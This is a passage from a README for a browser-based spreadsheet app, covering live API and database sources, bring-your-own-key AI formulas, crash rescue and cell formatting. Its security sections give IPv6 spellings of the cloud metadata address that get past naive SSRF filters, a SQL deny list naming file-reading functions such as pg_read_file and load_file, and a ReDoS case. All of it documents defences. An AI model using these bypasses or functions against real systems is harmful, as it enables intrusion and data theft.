**`sessionStorage`, not `localStorage`.** Closing the tab discards it. A key left in `localStorage`
on a shared or library machine outlives the person who typed it, and this is a tool people are told
to open without signing up — assuming the machine is theirs alone would be the wrong default. The
cost is retyping it in a new tab, which is the right trade for a secret.

**Verified by running it, not by reading it.** A Playwright run intercepts
`https://api.anthropic.com/**` and `**/api/ai/formula` at the same time and asks a real question. The
second is never called (`hit our own /api/ai/formula: false`); the first arrives with
`anthropic-dangerous-direct-browser-access: true` and its formula is what the panel displays.

> The question, the selected range and the column headers go to Anthropic only when the button is
> pressed — **the file itself is never sent**, and if nobody presses it, nothing leaves the machine.

### 🔌 Live data from an API / CSV (prototype)

<p align="center"><img src="public/screenshots/en/34-live-data.gif" width="820" alt="Picking a live source, pressing it into the sheet, and the table changing on its own every five seconds"></p>

<sub>Recorded from a production build by `npm run screenshots` — the source in it is one of the sample feeds the app serves itself under `/api/sample/*` (its numbers move every five seconds), added as a server-side source the way an operator adds any other.</sub>

<p align="center"><img src="public/screenshots/en/08-live-data.png" width="820"></p>

Connect a REST API or a CSV file and the values flow into cells on a schedule, with no script to write.
There are two ways, and the difference is **who makes the request**:

| | From your browser | Server-side source |
|---|---|---|
| Who fetches | Your own browser | The server running the app |
| Where it works | Everywhere, including [excel-to-go.vercel.app](https://excel-to-go.vercel.app) — nothing to install | Only on a deployment that sets `SOURCES_ADMIN_TOKEN` (self-hosted) |
| What it reaches | REST (JSON) and CSV that **your machine** can reach, including APIs behind a VPN or inside the office | REST, CSV/Google Sheets, PostgreSQL, MySQL that **the server** can reach |
| Where the credential lives | The header value sits in that tab's `sessionStorage` and goes when the tab closes | Encrypted on the server's disk; the browser never sees it |
| What you need from whom | The API must allow CORS for this site, over https ([what to ask IT for](#what-to-ask-it-for)) | Whoever runs the server sets the env and adds sources |

Once data arrives the two are identical, because both read it with the same code
(`src/lib/dataSources/collect.ts`) — following pages, the byte and time budget per refresh, backing off on a rate
limit, saying when a table is only part of the data — and people [put it into the sheet the same way](#putting-it-in-the-sheet--the-same-either-way).
It is one shared file because with two copies the two paths would one day disagree about what "partial" means.

#### From your browser (REST/CSV) — works on this site

**Live data** → **Connect your API**, then fill in a name · JSON or CSV · the URL · an auth header (name and
value, if the API needs one) · where the data sits in the JSON (optional; normally found for you) · how many rows
at most · how often to refresh. **Test** shows rows × columns and the first five rows before anything is saved,
and **Save and add to the sheet** goes straight on to the picker.

<p align="center"><img src="public/screenshots/en/47-browser-source.png" width="700" alt="The connect-from-this-browser form after a test: 6 rows × 3 columns and the first five rows"></p>
<p align="center"><sub><b>After a test</b> — 6 rows × 3 columns and the first five rows, before deciding to save</sub></p>

#### Try a sample API

No API of your own yet? The live-data panel has **three sample APIs** served by this site, with numbers that
move on their own, each in a shape real APIs come in — **Live sales** (a list whose values change every 5
seconds), **Today's summary** (an object of single values) and **Orders (several pages)** (120 rows, 25 a page,
to show the pages being followed). **Nothing is added for you**: "Try it" fills in the same form a real API uses,
and you test, save and put it in the sheet yourself — so trying one is practice for the real thing, not a shortcut
that only works on samples. They are on the app's own site, which `'self'` in the CSP already covers, so there is
no reload and nothing goes into the CSP cookie. A sample already connected shows as "Added" instead of inviting a
duplicate.

<p align="center"><img src="public/screenshots/en/49-sample-apis.png" width="700" alt="The live-data panel: Live sales, connected through Try it, is in the list, and the other two sample APIs still offer Try it"></p>
<p align="center"><sub><b>Sample APIs in the live-data panel</b> — Try it on Live sales, test, save, and it shows as Added; the other two wait their turn</sub></p>

It works the way draw.io opens a file: **the request goes from your browser straight to the API.** If this
machine can open the API — on the VPN, in the office, or on the public internet — the app can fetch it, and
**the URL, the header and the data never pass through our server.** No request to the app's own `/api/*`
carries any of the three. That is not taken on trust: a `check:e2e` flow records every request the page makes
to `/api/*` while an API is connected, tested, put in the sheet and left to refresh, and checks that none
carries the URL, the header or the data.

What is kept where:

| | Kept in | Why |
|---|---|---|
| Name, URL, header **name**, JSON path, max rows, refresh interval | This browser's `localStorage` (`etg-browser-sources`) | Not secret; the source is still there in a new tab |
| The header **value** (e.g. `Bearer …`) | `sessionStorage`, keyed by the source's id — and nowhere else | Gone when the tab closes; the app asks again on the next refresh. A token that outlives the tab is one a shared computer hands to the next person. A new tab without the value shows an amber **"Waiting for header"** label with a button to enter it — not "Connection failed", because nothing is broken |
| The workbook, exported files (.xlsx/.csv/.pdf), crash reports, the usage counter, requests to `/api/*` | No header value in any of them | |

The form warns about two things before saving: a URL whose query looks like a token (`token=`, `key=`,
`apikey=`, `access_token=` …) → move it into the header, because the URL is stored with the settings · a header
value with characters outside Latin-1 (Thai, or a `…` that came along with a copy) → refused with the reason,
because `fetch` cannot send one and throws before any request exists. Left alone, that would surface as a
"cannot connect" nobody could diagnose.

The fetcher (`browserSource.ts`) uses `fetch` with `mode: "cors"`, `credentials: "omit"` (no cookies, so a
company's single sign-on cookie is never sent by accident) and `cache: "no-store"` · accepts only `https://`
or `http://localhost` / `http://127.0.0.1` · follows next pages only on the same origin, and sends the header
only to that origin · **does not use `urlGuard`, deliberately.** That guard exists so nobody can point *our
server* at *our network*; here the network is the user's own, reached with the user's own permissions, and an
internal API is what the feature is for, not an attack on anyone. What stands between the page and another
origin on this path is the browser itself (CORS, mixed content, private-network rules) and the page's CSP,
which allows only the origins that user has added.

**A new API costs one page reload.** The CSP's `connect-src` is narrow for everyone, because it is what stops
an injected script from sending [the visitor's own API key](#-bring-your-own-api-key-byok) anywhere else; it
cannot be opened for everybody for the sake of this feature. So on save the app writes **only the origin** of
the URL (scheme + host + port, no path, no query) into a cookie, `etg-api-origins`, and `src/proxy.ts` adds that
origin to *that user's* policy only. A page's policy is fixed when it loads, so a new origin needs one reload:
the button says so before it is pressed (**"Allow and test"** / **"Save, allow and add to the sheet"**), the app
reloads for you and picks up where it was — running the test, or opening the picker.
- **It reloads only if the last autosave succeeded.** Otherwise it tells you to export first, because
  reloading then would lose whatever is only in memory.
- Someone who never adds a source gets the same CSP, **character for character** — e2e checks the real header
  before and after.
- Deleting the last source for an origin takes that origin out of the cookie.
- The security trade-off is written down plainly under [Security](#-security--what-was-actually-tested) and in
  [`SECURITY.md`](SECURITY.md).

#### What to ask IT for

Browsers do not tell a page why a request failed — unreachable, refused by CORS and refused by private-network
rules all come back as the same `TypeError`, on purpose. So the app says what it actually knows, and where it
does not know, gives a checklist that can be passed on instead of a guess:

| What happened | What the app says |
|---|---|
| The URL is `http://` and not localhost | Before sending: browsers don't let an https page call an http API; ask IT for https |
| `fetch` failed (unreachable / CORS / private network) | The three-point checklist below, with a **"Copy for IT"** button |
| 401 / 403 | The API refused the credentials; check the header name and value |
| 404 / 5xx | The status, and the URL with its query removed |
| Data came back but is not JSON/CSV, or there is no list at that JSON path | Can't read it as a table; try a JSON path — with the top-level keys that were found |
| Over the size or time limit for a refresh | The same messages as server-side sources (one set of limits, `fetchLimits.ts`) |

<p align="center"><img src="public/screenshots/en/48-browser-error.png" width="700" alt="An API that does not answer CORS: the form shows a three-point checklist for IT and a Copy for IT button"></p>
<p align="center"><sub><b>An API that does not answer CORS</b> — a checklist for IT instead of a bare error, and a button to copy it</sub></p>

The checklist (the same text the button copies, with the origin of the site actually open filled in):

1. **Are you on the VPN, and does the URL open in a new tab?** — if it does not open in a tab, the problem is
   before CORS
2. **CORS** — the API must answer `Access-Control-Allow-Origin: https://excel-to-go.vercel.app` and allow the
   header in use (`Access-Control-Allow-Headers`), including on the `OPTIONS` preflight the browser sends first
3. **An API on an internal IP** — Chrome/Edge may need `Access-Control-Allow-Private-Network: true` on the
   preflight, or the user allowing local network access when the browser asks. **This point has not yet been
   tested against a real internal address**, which is why it says "may" rather than "must" · if an internal API
   behaves differently from this, that is exactly the information still missing

An e2e flow points the form at an API with no CORS and checks that this checklist appears rather than a bare
error — naming the header IT has to send, with the site's own origin, and asking about the VPN first.

#### Databases / server-side sources (self-host)

A browser cannot connect to PostgreSQL or MySQL directly — a web page cannot open a TCP connection to a database.
The simplest route is the company's or the ERP's API, the way above. If you want the **server** to do the fetching
— a [direct database connection](#-straight-into-a-database-postgresql--mysql), a URL and credential hidden from the
people using the sheet, or somewhere the server can reach and users' machines cannot — run the app on your own
server (the [in-app guide](#-connect-your-own-data-the-in-app-guide) has a four-step starter kit).

**This part appears in the UI only when the deployment sets `SOURCES_ADMIN_TOKEN`.** The root layout checks on
every request and marks the page (a yes/no, never the token). Without it there is no token box and no "this
feature is switched off" message to puzzle over · the server routes still refuse every request without the token
· `NEXT_PUBLIC_DEMO_MODE=1` is still read for older deployments and now means exactly one thing: server-side
sources off, even with a token.

It is split into two roles so the end user touches as little technology as possible — **tech sets it up once**:
"Connect new data" in the **Live data** panel, enter a REST API URL or a CSV/Google Sheets link, an auth header if
needed, and a refresh interval, then "Test connection" to see how many rows and columns come back before saving.
Config and credentials live on the server (`data/sources.json`, gitignored) and never reach the user's browser;
the server does the fetching, so CORS isn't the user's problem · **everyone else** just
[puts it in the sheet](#putting-it-in-the-sheet--the-same-either-way).

<p align="center"><img src="public/screenshots/en/09-source-setup.png" width="700"></p>

**It has to be unlocked with the token first** — it tells the *server* to fetch a URL for you, which is a
capability that needs an owner. With `SOURCES_ADMIN_TOKEN` unset the API answers 403 to everything rather than
being left open to whoever loads the page.

<p align="center"><img src="public/screenshots/en/24-sources-locked.png" width="820"></p>
<p align="center"><sub>On a deployment that sets the token — connecting an API from the browser is still the top button, and the server-side token box sits below it</sub></p>

The guards:

| | |
|---|---|
| **A token is required** | Unset means off, not open (403) · compared in constant time · held in `sessionStorage`, so closing the browser asks again |
| **It cannot reach your private network** | **Every address DNS returns** is checked, and re-checked after **every redirect** — loopback, RFC 1918, `169.254.169.254` (metadata on AWS/GCP/Azure), IPv6 link-local, unique-local and documentation, and IPv4 carried inside IPv6 as `::ffff:`, `::`, SIIT `::ffff:0:0/96`, NAT64 `64:ff9b::/96` or 6to4 `2002::/16` (unpacked and checked as IPv4) · local-use NAT64 `64:ff9b:1::/48` and Teredo `2001::/32` refused outright |
| **One refresh has a size and a time limit** | The body is read as a stream and stopped the moment it passes ~49 MB per refresh (every page together, counted after decompression — room for 50,000 rows, measured at 8.1–34.9 MB) · 15 seconds per request, up to the body's last byte · 45 seconds for the whole refresh · on the first page the panel says which limit was hit, in plain words; on a later page the rows already fetched are kept and marked partial · **at most 4 MB goes on to the browser per refresh** (under Vercel's 4.5 MB response limit): a bigger table arrives with the rows that fit, marked partial for its size, never as a 413 · measured on the route's own JSON: the sample feed's shape (7 fields) fits about **41,800 rows**, twenty fields of Thai text about **7,700** · (a source connected from the browser has the same byte and time budget, but no 4 MB leg, since nothing passes through the server) |
| **A credential stays on its own origin** | The auth header goes only to the scheme, host and port the source was set up with · a redirect elsewhere is followed without it (and it is not put back) · a next-page link to another origin is not followed — the table stops there, marked partial |
| **Credentials are encrypted at rest** | AES-256-GCM under `SOURCES_SECRET_KEY` · with no key it refuses to store a credential rather than writing one in the clear · a database connection string counts as one |
| **A database query cannot write** | Every query runs in a read-only transaction, so the database itself refuses a write, and `sqlGuard` refuses again at save time · a database on a private address needs its host in `SOURCES_ALLOWED_DB_HOSTS` |

The easy one to get wrong, found by testing rather than reasoning: `new URL("http://[::ffff:169.254.169.254]/")`
rewrites the host as `::ffff:a9fe:a9fe`, so a filter that only knew the dotted form waves the
metadata service straight through. The address is now unpacked and checked. A later QA pass found it
still missed NAT64 (`64:ff9b::a9fe:a9fe`) and 6to4 (`2002:a9fe:a9fe::1`) while the docs said "every
spelling"; both are handled now, and the docs name the forms that are covered instead of saying "every".

**Not fully closed:** the address is checked and then the connection is made, and in between the
name could be re-resolved to something else. Closing that needs the connection pinned to the checked
address, which Node's `fetch` does not expose — `SECURITY.md` says so plainly rather than claiming
the guard is airtight.

#### Putting it in the sheet — the same either way

**Everyday users: three clicks, no jargon** — no JSON, no API keys, no aggregate function names.

| Step | What the user sees |
|---|---|
| 1. Select the target cell, click **"Insert into sheet"** | One primary button per source — nothing else to decide yet |
| 2. Choose **"Whole table"** or **"A single summary number"** | A full-width preview table, or cards showing the **actual live numbers** (e.g. `9,510 · Sum of total`) — no need to know what "sum" means in the abstract |
| 3. Confirm the target cell and click **"Insert into sheet"** | It states up front how many rows × columns it will use, and warns if that would overwrite existing content |

<table>
<tr>
<td align="center"><b>Whole table — preview before placing</b><br>
<img src="public/screenshots/en/10-picker-table.png" width="410"></td>
<td align="center"><b>Single value — real numbers to pick from</b><br>
<img src="public/screenshots/en/12-picker-values.png" width="410"></td>
</tr>
</table>

**Once placed**, the grid scrolls to show the whole block and the side panel closes itself — left open, it sat
over the very columns the table just landed in. Clicking the block brings up a toolbar beside it showing which
source it came from and how often it updates, with **Refresh / Change / Remove** — no trip back to the panel.

<p align="center"><img src="public/screenshots/en/11-block-toolbar.png" width="820"></p>

**Inserting or deleting rows and columns around a block** — the block moves with the cells around it, so a total
or a note typed under it is not written over by the next refresh. Inserting or deleting a row or column *inside*
a block is refused, with the reason: the next refresh would write over an inserted row, or write a deleted one
back over your row below. Deleting a block's header row (or a single value's own cell) **unlinks** it: the values
stay as ordinary cells and simply stop updating. All of it undoes.

**An API that returns an empty list** (the last page, a search with no results) gives a table with just its header,
using the columns the block last had — not the envelope's `ok | page | total…` turned into a row, which is what it
used to do, with a SUM then reading the envelope's `total` as data. If the envelope holds **several** empty lists,
the app does not guess which one the table is: it says it cannot read a table, lists the keys, and leaves the JSON
path to you. Both browser and server sources behave this way, since they share the converter.

**CSV sources and codes with leading zeros** — each CSV field is read by [the grid's own rule](#-phone-numbers-and-codes-keep-their-zeros),
so `007`, `0812345678` and all-digit values of 12 digits or more arrive as text, exactly as sent, while `12.5` and
`-3` are still numbers. (Every field used to go through `Number()`, so a branch code `007` reached the sheet as
`7`.) JSON sources are unchanged: their types come from the JSON, and a string `"123"` in JSON still lands as a
number, as before.

**Paginated APIs** — most APIs hand back one page at a time, so a single fetch gets the user the
first 25 rows and leaves them believing that's all the data. Following pages are therefore fetched
automatically, with **nothing extra to configure** — the signals APIs already send are read in this
order:

| Signal | Example | Who sends it |
|---|---|---|
| `Link` header with `rel="next"` | `Link: <…?page=2>; rel="next"` | GitHub, GitLab |
| A next-page URL field in the body | `next`, `next_page_url`, `links.next`, `_links.next.href`, `@odata.nextLink` | Laravel, HAL, OData |
| A cursor / token | `next_cursor`, `nextPageToken`, `scroll_id` → sent back as a query param | Slack, Google APIs |
| A param the URL already carries | tech wrote `?page=1` or `?offset=0` → it gets incremented | APIs that signal nothing |

That last row matters: `?page=2` is never **invented** for a URL that doesn't already have the
param, because an API that doesn't support it would just return page 1 forever. Writing the param
into the URL is how tech opts in.

Tech sees a single field for all of this: **"Fetch up to [1000] rows"** (0 = first response only).
The rest is guard rails — at most 20 requests per refresh, a 45-second total budget, a stop when a
next link points back at a page already fetched, an empty page ends it, and if a page partway
through fails, **the rows already collected are still returned** rather than the whole refresh
being thrown away.

<p align="center"><img src="public/screenshots/en/13-partial-data.png" width="820"></p>

**And when the data is incomplete, it says so.** A silently partial table is more dangerous than a
small one the user knows about: a "Sum" card computed from the first 40 rows of a 120-row source
reads exactly like a real total and isn't one. So the warning appears in the **side panel**, in the
**picker** before the user commits to a summary value, and in the tech-side **connection test**.

**When an API says "too many requests"** — the problem isn't only that `HTTP 429` means nothing to a
non-technical user. It's that the poller keeps firing on its normal interval, which is the one
response guaranteed to keep the source broken. So:

- **The wait is read from the response**: `Retry-After` (both the seconds form and the HTTP-date
  form), falling back to the `X-RateLimit-Reset` family — which is maddeningly inconsistent (epoch
  seconds, epoch milliseconds, or seconds-from-now), so it's told apart by magnitude rather than by
  trusting any one convention. With nothing to go on, 60 seconds; capped at 15 minutes.
- **429 is separated from an ordinary 403** — a 403 counts as rate limiting only when a header says
  the remaining quota is zero (GitHub answers that way). Treating every 403 as a rate limit would
  turn a permission error into "try again later" and leave the user waiting on something that will
  never fix itself.
- **Polling actually stops during the wait**, not just the message changes — verified by a test that
  counts requests on the API side: a source on a 5s interval, 429'd with a 40s wait, received
  **0 further requests** over the next 16 seconds. Unaffected sources keep refreshing throughout.
- **A rate limit partway through pagination** still returns the rows already collected, with the
  wait attached — no data lost, and the next poll doesn't walk back into the same wall.
- **Ordinary failures back off too** (exponential from the source's own interval, capped at 15
  minutes), so a source that is simply down stops being polled every few seconds forever.
- The user sees plain language with a live countdown and a **"Try now"** button to override it — a
  manual refresh always goes through, because a person clicking is a deliberate act, not the poller.

<p align="center"><img src="public/screenshots/en/14-rate-limited.png" width="820"></p>

Behind the scenes:

- The app converts JSON into a table on its own (finds the largest array of records in the response, flattens
  nested objects into `customer › name` columns). A single-row KPI object is broken out into individual values
  you can pick field by field.
- Linked cells are tinted green with a border around the block and a bold header row, are read-only, and
  **refresh themselves on the source's schedule** (polling). Regular formulas (`=A10*2`, `SUM`, `VLOOKUP`) and
  Excel/PDF export work on live data immediately, because the app writes real values into the cells.
- Refreshes **never enter the undo history** (zundo is paused during the write) — one Ctrl+Z undoes the whole
  placed block, and "Change" (clear the old block + place the new one) counts as a single step too.
- **Drag and drop still works** for people who prefer it, it's just no longer the primary path.
- The side panel keeps a "Live data in this sheet" list showing what is placed where, each with its own remove
  button.
- **This site's three sample APIs** (`/api/sample/sales`, a table whose numbers drift every 5s;
  `/api/sample/summary`, a set of single values; and `/api/sample/orders`, **paginated**, 25 rows a page over 120)
  sit in the live-data panel under **"Try a sample API"** — see [Try a sample API](#try-a-sample-api) above.
  Nothing is added for you: the server does not seed `data/sources.json`, and a sample is connected by pressing it.

#### Limits

- **No PostgreSQL / MySQL from the browser** — it is not technically possible. Use the company's or the ERP's
  API instead, or run the app on your own server to use a [server-side source](#databases--server-side-sources-self-host).
- **No company cookie / single sign-on auth** (`credentials: "include"`) **and no OAuth yet** — only a header
  you type in.
- **No "remember the token on this device"** — close the tab and the header value has to be entered again. That
  is on purpose (see the table above); an opt-in version is on the [roadmap](#-whats-next).
- **The API has to allow CORS for the site you are on** — the app cannot do that for it. If the API's owner will
  not, the remaining route is a server-side source.
- **An `http://` API other than localhost does not work from the https site** — the browser blocks it (mixed
  content).
- **Redirects are followed by the browser** — the browser drops `Authorization` on a cross-origin redirect but
  keeps other custom header names (such as `X-API-Key`), and the API chooses where it redirects. The server-side
  path follows redirects itself and drops every header name; a page cannot, because it is not allowed to read
  where a cross-origin redirect goes.
- **Server-side sources do not work on Vercel** — they are stored in `data/sources.json`, and Vercel's disk is
  read-only. Run on a VPS, Docker with a volume, or a machine in the office. (Connecting from the browser works on
  Vercel as normal, because nothing is stored on the server.)
- **There is no follow-along sample on the site yet** — the three sample sources that used to be put there are
  gone; a step-by-step sample is on the [roadmap](#-whats-next).

### 🗄 Straight into a database (PostgreSQL / MySQL)

A [server-side source](#databases--server-side-sources-self-host) — it needs the app running on your own server
with `SOURCES_ADMIN_TOKEN` set, because a browser cannot reach a database directly. Identical to a server-side
REST source in every way that reaches a user. What the technical person fills in is different: instead of a URL, a **connection string and one SQL statement**. Everyone else sees the
resulting table exactly as they see any other source — **they never see the SQL**, which is the
whole reason this feature was split into two roles in the first place.

```
postgres://user:pass@db.example.com:5432/shop
select region, sum(total) as revenue from orders group by region
```

**The query is guarded twice, and only one of the two is a guarantee.**

- **The guarantee:** every query runs inside a **read-only transaction** (`begin read only` /
  `set session transaction read only`), so a write is refused by the database itself whatever the
  text said. MySQL connections open with `multipleStatements: false`, so one string cannot carry a
  second statement.
- **The early warning:** `sqlGuard.ts` refuses, at save time, anything that is not a single
  `SELECT`/`WITH` — a second statement, a write keyword, `SELECT … INTO OUTFILE`, `pg_read_file`,
  `load_file`, `pg_sleep`. It scans the statement with comments, strings, quoted identifiers and
  Postgres dollar-quoting **blanked out** rather than removed, so nothing left over can be spliced
  together, and an unterminated comment or quote is a refusal rather than a guess about where it
  ended.

A keyword list can always be walked around; a read-only transaction cannot. Both are here because
the first gives a clear error while somebody is still looking at the form and the second gives a
correct outcome at three in the morning. Those are not the same job.

**A connection string is a credential**, so it is encrypted at rest like an auth header, and the
browser never sees the string — only a description of it
(`postgres://••••••••@db.example.com/shop`), with no user and no password in it.

**One network rule is deliberately looser than the REST side.** A database on a private address is
the *normal* case — an RDS instance inside a VPC, a container beside the app — and applying the
REST rule would make the feature useless in exactly the deployments it exists for. So the
private-address rule still stands by default and `SOURCES_ALLOWED_DB_HOSTS` is the way past it: a
list only the operator can write, that nothing a browser sends can add to, and where a near miss
(`evil.db.internal` against an allowed `db.internal`) is not a match. A string naming a **unix
socket** is refused in both spellings — as a path host, and as the `?host=` parameter the Postgres
driver prefers over the host in the URL — because a socket steps around every address check by not
using an address.

**Stated limits:** the database account's permissions are yours to scope. This app cannot stop a
query reading a table you would rather it did not; the right answer is a read-only role that sees
only what the source is meant to publish. TLS happens only if the string asks for it
(`sslmode=require`, `?ssl=true`), and `sslmode=disable` is honoured as written, because a
connection that merely *looks* encrypted is worse than one that admits it is not. There is no
table picker yet (the SQL is typed), and **no test connects to a real database** — so the code that
touches a driver is kept as thin as it can be, and every judgement call lives in pure modules that
are tested without one.

### 📘 Connect your own data: the in-app guide

**`/guide`** is where the app sends someone who wants their own API or database: from the phone menu,
from the link at the foot of the live-data panel, and from the landing page's footer.
The answer used to live only in this README, which is where people who already know it come to read. The
person asking is the one who just looked for it in the app and could not find it.

<p align="center"><img src="public/screenshots/en/46-guide.png" width="820"></p>

Ordered the way most people need it — the way that works on this site first, running your own server after —
and **every command block has a copy button** (the result is announced through a live region):

| Part | What is in it |
|---|---|
| Connect an API on this site | Four steps: Live data → Connect your API → Test (a new API reloads the page once) → Save and add to the sheet · the URL, header and data never pass through our server |
| What to ask IT for | CORS, https and private networks — the same three points the "Copy for IT" button sends |
| A database, or the server fetching for you | Why a browser cannot reach PostgreSQL/MySQL directly, and when to run the app on your own server |
| What the server can connect | REST API · CSV/Google Sheets · PostgreSQL · MySQL/MariaDB — what each asks for, with an example |
| A four-step starter kit | clone and install → `.env.local` (`SOURCES_ADMIN_TOKEN`, `SOURCES_SECRET_KEY`, `SOURCES_ALLOWED_DB_HOSTS`) → run on a server that can write files → unlock and connect in the app |
| What the app guards, and what is up to you | The token, private networks, encrypted credentials, read-only SQL — and the database role you still have to scope |
| "Cloud save" is not connecting a database | The cloud tab keeps your workbook on your own Supabase; it has nothing to do with pulling data in |

**Stated on that page, plainly:** **server-side** live data does not work on Vercel, because sources are kept in
`data/sources.json` and Vercel's disk is read-only; it needs a VPS, Docker with a volume, or a machine of
your own. The page is what this README and `SECURITY.md` already say, in fewer words. When either of those
changes, it has to follow — and no gate compares them yet.


### 📐 Spreadsheet grid

- Click to select a cell, **double-click**/**F2** to edit, or just start typing to overwrite it directly.
- An always-visible **formula bar** shows the selected cell's address and raw content, just like Excel — edit
  from there directly.
  It always shows what the cell holds *now*, even right after a Delete, a sort or an undo, and clicking into it
  and out again without typing writes nothing.
- Move with arrow keys/Enter/Tab, clear content with Delete/Backspace (formatting is preserved).
- Select a range by dragging or Shift+click; click a row/column header to select the whole row/column.
- Row/column headers are sticky and highlighted for the current selection — fixes the "scrolled and now I'm
  lost which row I'm on" problem.

### 💾 Autosave + Undo/Redo

- Every edit (typing a value, inserting a formula, formatting, importing a file) autosaves to `localStorage`
  immediately — closing the tab or refreshing keeps your data (tied to that browser/device only, no cross-device
  sync). **A workbook too big for the browser's quota (~5 MB) no longer vanishes in silence:** a red bar appears
  the moment a save does not land, with an export button in it, and editing and exporting carry on as normal.
- **Ctrl+Z** / **Ctrl+Y** (or Ctrl+Shift+Z) undo/redo content edits only — moving the selection or switching
  sheet tabs doesn't count as history.

### 🩹 The app can break and you still get your file out

When a render throws, what you used to get was Next's bare crash page: no explanation, no way back,
and — the part that actually matters in a spreadsheet — no sign of whether the work was gone. **It was
never gone.** The sheet lives in `localStorage` and a render crash never touched it, but nothing on the
screen said so, which from the outside is indistinguishable from having lost it.

So this screen does three things, in the order a person cares about them: says the data is safe, offers
it as one downloadable CSV per tab right now, and only then offers to try again.

<p align="center"><img src="public/screenshots/en/39-crash-rescue.png" width="760"></p>

The rescue (`crashRescue.ts`) **touches no store, no model and no formula engine** — those three are the
prime suspects for whatever just threw. It reads the raw JSON out of `localStorage` with the same posture
it would read a file someone uploaded: every field may be missing or the wrong type (there are tests for
each of those states, and none of them throws). Formulas come out as the text you typed rather than as
values, because nothing on this path evaluates anything, deliberately.

There are two layers: `error.tsx` catches a throw inside the page, `global-error.tsx` a throw inside the
layout. The second is rendered as its own document, **which means the app's stylesheet is not loaded** —
so it is styled inline in a system font. A fallback that still depends on a stylesheet loading is one
more thing that can fail at the moment everything else already has. The behaviour is shared through one
hook, so the two screens may look different but cannot act differently.

**And now the operator hears about it — if they asked to.** The crash screen got the user's work
back out and told nobody else, so a bug that only fires on one imported file could run for months
unnoticed. Set `NEXT_PUBLIC_ERROR_REPORT_URL` to your own collector and both boundaries post a
report to it; leave it unset — the default, and what the public site does — and nothing is sent,
because there is no default endpoint to forget to unset.

This is in tension with the one thing the app promises, so what a report may contain is a fixed
list rather than "the error object": a message, Next's digest, a trimmed stack, the **path without
its query string**, the browser's user-agent, and a timestamp. Message and stack are capped, so one
report cannot become a data channel.

And the stack is **scrubbed** before it leaves, because a thrown error carries whatever was in
scope: an Anthropic key the visitor pasted, a Supabase token, an email address — and any run of
Thai, which in a stack from this app is a cell, a sheet name or a file name rather than anything
about the code. An ordinary English stack comes through untouched, which is checked too: a redactor
that eats the trace reports nothing useful.

**The redactor was itself the hole.** The email pattern was written the obvious way —
`[^\s"']+@[^\s"']+\.[A-Za-z]{2,}` — and both runs can swallow an `@`, so on a long string with no
`@` in it the engine retries every split of every start position: 50,000 characters of one letter
took 2.8 seconds. That is a ReDoS, and the input is not hypothetical, because this function reads
an error message and an error message here can carry a whole cell. **A crash reporter that hangs
the crash screen has taken the one thing the crash screen was for.** Both sides now exclude `@` and
carry RFC 5321's bounds (64 and 255); the same input takes 19ms. It was not found by reading the
code — CI went red three runs running, on a different Node version each time, because the test sat
either side of a 5s limit. The two tests added for it measure the *growth rate* rather than the
clock (ten times the input must not cost a hundred times the time), because a stopwatch on a busy
runner is not evidence but a ratio is.

The report endpoint's origin joins `connect-src` automatically. A collector that is configured but
not in the policy would be blocked silently, which is worse than having none — the operator would
believe they had one.

### ✂️ Copy / Cut / Paste

- **Ctrl+C / Ctrl+X / Ctrl+V** with a dashed highlight showing status (blue = copied, orange = cut).
- Pasting a copied formula adjusts relative references automatically, just like Excel.
- Paste text from elsewhere too (e.g. real Excel or Google Sheets) — splits into columns/rows by tabs/newlines
  automatically, and grows the sheet if the pasted block is bigger than the current table.
- **Cut works across sheets** — cut on one sheet, paste on another: the source cells are cleared, the destination
  changes only where the block lands, and one undo puts both sheets back. If the source sheet was deleted before
  the paste, the paste is a copy and clears nothing. **Not supported yet:** formulas that pointed at the moved cells
  still point at the old address rather than following them, as Excel's would.

### 🎨 Cell formatting

Bold, **italic, underline**, text alignment (left/center/right), text color, number format (general / 2 decimal places / percent /
currency ฿ / [text](#-phone-numbers-and-codes-keep-their-zeros)) — travels with the cell on copy/paste and survives Excel export too.

<p align="center"><img src="public/screenshots/en/06-format-filter.png" width="820"></p>

**Italic and underline only just got buttons.** Both were in the model long before: an imported .xlsx kept
them, the grid drew them and the export wrote them back, but nothing in the app could set them. They now sit
with bold (B · I · U joined into one group like the alignment buttons, which takes less room than three
separate ones); the whole selection follows its first cell, as bold does, and it is one undo step.

The formatting row **folds away** (the brush button at the end of the formula bar). On a 1366×768 laptop the
three stacked bars ate 150px before a single grid row appeared; folded, that's 107px.

**`Ctrl+B` / `Ctrl+I` / `Ctrl+U`** (`Cmd` on a Mac) toggle bold, italic and underline across the selection
without opening a cell. They used to do nothing at all in the grid, though they are among the first keys
someone arriving from Excel tries. They are listed in the shortcuts dialog under "Text style".

### 🪣 Fill colour

The **paint bucket** in the formatting row opens seven swatches and "no fill", applied to the whole selection;
it travels with copy/paste and the `.xlsx` export and is one undo step. The bar under the bucket shows the
selected cell's fill, and the swatch in use is ringed.

<p align="center"><img src="public/screenshots/en/52-fill-colour.png" width="820" alt="The header row tinted light yellow, with the swatches open and the yellow one ringed"></p>

**Why swatches and not a colour wheel.** In the blind test, the first thing an Excel user reached for after
typing a header row was the paint bucket. Imported fills had shown for a long time, but nothing could set one.
The swatches are the lightest row of Excel's own palette, so a header stays readable and a file sent back looks
at home there; a colour wheel (`<input type="color">`) on a phone is a small, fiddly target that invites a dark
fill under dark text.

**Not supported yet:** a colour outside these seven (fills from an imported file still show and export in full) ·
fills do not yet reach the **PDF export**.

### 🔢 Phone numbers and codes keep their zeros

Type a phone number `0812345678`, a Thai ID card `1234567890123` or a product code `00123` and **you get what you
typed** — on the grid, in `.xlsx`, CSV and PDF, when sorting, filtering, in a pivot and in a chart. The leading
zero used to vanish silently from every one of those at once: every cell that could be read as a number was
turned into one when the sheet computed, and the `.xlsx` writer carried its own copy of that logic. Both now
share one rule (`src/lib/cellLiteral.ts`), in this order:

| Rule | Example | Result |
|---|---|---|
| A leading apostrophe (as in Excel) | `'123` | the text `123` — the grid hides the `'`, the formula bar shows it |
| A cell formatted as **Text** (number format menu · Excel's `@`) | `123` | text — for a whole column of codes |
| An integer with a leading zero | `0812345678`, `00123` | text, automatically (`0` and `0.5` are still numbers) |
| Twelve digits or more, nothing else | `1234567890123` | text, automatically (eleven digits or fewer, or with a point or sign, are numbers) |
| Everything else | `-3`, `12.50`, `10000000000` | a number, as before |

In an `.xlsx` export, number-looking text is a string cell with the `@` format, so Excel does not turn it back
into a number when somebody edits the cell. On import, a string cell the rules would read as something else
(`"123"`, or text starting with `=`) gets its `'` back, so the file makes the round trip unchanged. Formulas
reading these cells behave like Excel's: `=A1+1` still computes, `=LEN(A1)` is 10, `=A1&""` is `"0812345678"`.

